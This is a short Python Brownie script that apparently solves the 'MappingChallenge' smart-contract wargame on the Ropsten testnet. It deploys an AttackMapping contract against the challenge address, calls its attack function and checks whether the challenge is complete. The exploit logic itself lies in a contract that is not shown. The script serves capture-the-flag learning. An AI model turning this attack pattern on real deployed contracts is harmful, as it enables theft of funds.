from scripts.helpful_scripts import POINT_ONE, get_account, ONE
from brownie import MappingChallenge, AttackMapping, network, Contract


# for local test
def deploy_contract(contract, arg=None, value=0):
    account = get_account()
    if arg:
        return contract.deploy(arg, {"from": account, "value": value})
    return contract.deploy({"from": account, "value": value})


def main():
    # print(network.show_active())
    account = get_account()

    # for local test
    # contract = deploy_contract(MappingChallenge)
    # # on ropsten network
    contract_address = "0xFE35d53293c260fBbCC7aEEDcBf0Cc5c1C12BA72"
    contract = Contract.from_abi(
        MappingChallenge._name,
        contract_address,
        MappingChallenge.abi,
    )
    attack_contract = deploy_contract(AttackMapping, contract)
    print(contract.isComplete())
    attack_contract.attack({"from": account})
    print(contract.isComplete())
